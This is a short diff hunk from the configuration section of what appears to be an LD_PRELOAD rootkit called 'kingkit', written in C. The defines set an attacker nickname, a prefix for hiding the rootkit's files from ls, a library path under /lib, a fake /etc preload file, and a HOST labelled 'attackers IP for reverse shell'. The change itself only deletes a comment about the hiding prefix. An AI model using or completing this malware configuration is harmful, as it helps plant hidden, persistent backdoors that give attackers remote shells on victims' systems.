@@ -28,7 +28,7 @@
 
 //change these
 #define KING_NAME "Arnout" //put your nickname here
-#define HIDE_PREFIX "kingkit" //match LIB_PATH and FAKE_PRELOAD with the HIDE_PREFIX so they are hidden from ls
+#define HIDE_PREFIX "kingkit"
 #define LIB_PATH "/lib/kingkit.so"
 #define FAKE_PRELOAD "/etc/kingkit.so.preload"
 #define HOST "127.0.0.1" //attackers IP for reverse shell
